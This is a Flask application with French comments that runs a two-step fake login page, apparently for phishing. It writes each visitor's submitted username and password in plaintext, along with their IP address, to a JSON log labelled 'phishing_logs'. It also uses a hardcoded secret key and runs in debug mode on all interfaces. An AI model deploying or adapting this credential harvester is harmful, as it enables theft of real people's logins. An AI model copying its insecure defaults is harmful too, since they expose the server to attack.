from flask import Flask, request, session, redirect, url_for, abort
import os
import json
from datetime import datetime, timezone

app = Flask(__name__)
app.secret_key = 'ta_cle_secrete'

# Chemin vers le fichier JSON de logs
LOG_FILE = os.path.join(os.path.dirname(__file__), 'logs', 'phishing_logs.json')

# Créer le dossier et le fichier de logs s'ils n'existent pas
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w') as f:
        json.dump([], f)

def read_html_file(filename):
    file_path = os.path.join(os.path.dirname(__file__), 'templates', filename)
    if not os.path.exists(file_path):
        abort(404, description=f"Fichier {filename} introuvable")
    with open(file_path, 'r', encoding='utf-8') as file:
        return file.read()

def log_attempt(login, password, ip):
    log_entry = {
        "@timestamp": datetime.now(timezone.utc).isoformat(),
        "login": login,
        "password": password,
        "ip": ip,
        "event": "fake_login_attempt"
    }

    # Lire les logs existants
    with open(LOG_FILE, 'r') as f:
        logs = json.load(f)

    # Ajouter la nouvelle tentative de connexion
    logs.append(log_entry)

    # Écrire les logs mis à jour
    with open(LOG_FILE, 'w') as f:
        json.dump(logs, f, indent=4)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session['login'] = request.form.get('login')
        return redirect(url_for('password'))
    return read_html_file('login.html')

@app.route('/password', methods=['GET', 'POST'])
def password():
    if request.method == 'POST':
        password = request.form.get('password')
        ip = request.remote_addr

        # Enregistrer les informations dans le fichier JSON
        log_attempt(session.get('login', ''), password, ip)

        session['connected'] = True
        return redirect(url_for('connect'))

    if 'login' not in session:
        return redirect(url_for('login'))

    html_content = read_html_file('password.html')
    html_content = html_content.replace('{{ login }}', session.get('login', ''))
    return html_content

@app.route('/connect')
def connect():
    if not session.get('connected'):
        return redirect(url_for('login'))

    html_content = read_html_file('connect.html')
    html_content = html_content.replace('{{ login }}', session.get('login', ''))
    return html_content

@app.route('/logout')
def logout():
    session.pop('connected', None)
    session.pop('login', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
